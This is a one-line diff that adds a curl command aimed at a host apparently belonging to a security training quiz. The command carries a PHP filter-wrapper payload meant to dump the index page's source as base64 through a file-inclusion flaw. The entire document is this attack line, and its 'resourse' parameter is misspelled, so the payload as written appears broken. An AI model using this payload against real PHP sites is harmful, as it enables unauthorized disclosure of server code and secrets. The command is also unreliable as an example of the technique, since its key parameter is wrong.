@@ -1,0 +1,1 @@
+curl https://quiz.ais3.org:23545/?p=php://filter/convert.base64-encode/resourse=index
